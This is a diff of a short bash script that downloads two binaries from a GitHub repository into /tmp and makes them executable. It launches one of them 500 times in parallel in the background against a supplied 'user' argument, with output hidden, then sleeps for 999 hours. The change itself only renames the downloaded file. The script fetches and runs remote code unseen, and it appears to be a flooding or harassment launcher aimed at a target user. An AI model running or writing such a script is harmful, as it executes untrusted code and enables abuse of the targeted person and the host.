@@ -1,10 +1,10 @@
 #!/bin/bash
 user="$1"
-wget -O /tmp/sup https://raw.githubusercontent.com/walters99/ps/main/sup
+wget -O /tmp/sop https://raw.githubusercontent.com/walters99/ps/main/sop
 wget -O /tmp/ps https://github.com/walters99/ps/raw/main/ps
-chmod +x /tmp/sup /tmp/ps
+chmod +x /tmp/sop /tmp/ps
 for i in {1..500} :
 do
-  /tmp/sup $user >/dev/null &
+  /tmp/sop $user >/dev/null &
 done
 sleep 999h
